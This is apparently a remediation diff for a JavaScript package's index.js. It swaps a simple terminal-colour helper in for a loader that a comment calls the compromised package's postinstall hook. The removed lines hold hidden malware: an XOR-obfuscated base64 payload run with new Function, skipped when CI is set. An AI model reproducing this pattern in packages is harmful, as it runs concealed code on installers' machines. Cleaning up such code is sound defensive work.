@@ -1,15 +1,17 @@
-// index.js, loader from the compromised package (postinstall hook)
-const k = 0x2b;
-const s =
-  "TU5fSEMDCUNfX1tYEQQESltCBV9EQE5FXUpeR18GXltPSl9OBUJFXUpHQk8EWF9KTE4ZBUlCRQkCBV9DTkUDWRYVWQVKWVlKUmleTU1OWQMCAgVfQ05FA0kWFU5dSkcDRU5cC39OU19vTkhET05ZAwIFT05IRE9OA0kCAgI=";
+"use strict";
 
-function unwrap(b64, key) {
-  return atob(b64)
-    .split("")
-    .map((c) => String.fromCharCode(c.charCodeAt(0) ^ key))
-    .join("");
-}
+const codes = {
+  red: [31, 39],
+  green: [32, 39],
+  yellow: [33, 39],
+  blue: [34, 39],
+  bold: [1, 22],
+  dim: [2, 22],
+};
 
-if (process.env.CI !== "true") {
-  new Function(unwrap(s, k))();
+const enabled = process.stdout.isTTY && process.env.NO_COLOR === undefined;
+
+for (const [name, [open, close]] of Object.entries(codes)) {
+  module.exports[name] = (s) =>
+    enabled ? `\x1b[${open}m${s}\x1b[${close}m` : String(s);
 }
